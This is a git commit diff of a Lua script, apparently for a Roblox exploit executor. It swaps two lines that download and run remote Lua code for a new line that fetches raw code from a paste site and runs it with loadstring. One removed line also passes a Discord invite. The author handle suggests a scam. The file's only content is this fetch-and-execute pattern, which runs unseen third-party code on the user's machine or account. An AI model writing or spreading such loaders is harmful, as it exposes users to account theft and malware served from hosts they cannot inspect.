355933927cf02be7c9179bcafd5866f4d2ab78fb
terist999 <xscammer25@gmail.com>
2025-07-26 07:07:53 -0800

    Update projectscript.lua

--- projectscript.lua
+++ projectscript.lua
@@ -1,2 +1,1 @@
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/RtiAeX82Dob2HeVy/raw", true))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
+loadstring(game:HttpGet("https://pastefy.app/TcTZ8k7a/raw"))()
